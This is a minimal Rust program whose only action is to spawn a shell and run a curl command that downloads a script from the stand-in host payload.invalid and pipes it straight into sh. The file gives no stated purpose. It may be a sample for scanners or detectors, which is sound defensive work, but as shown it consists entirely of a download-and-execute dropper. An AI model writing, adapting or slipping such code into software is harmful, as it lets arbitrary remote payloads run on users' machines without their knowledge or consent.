use std::process::Command;
fn main() {
    let _ = Command::new("sh").arg("-c").arg("curl -fsSL https://payload.invalid/x.sh | sh").status();
}
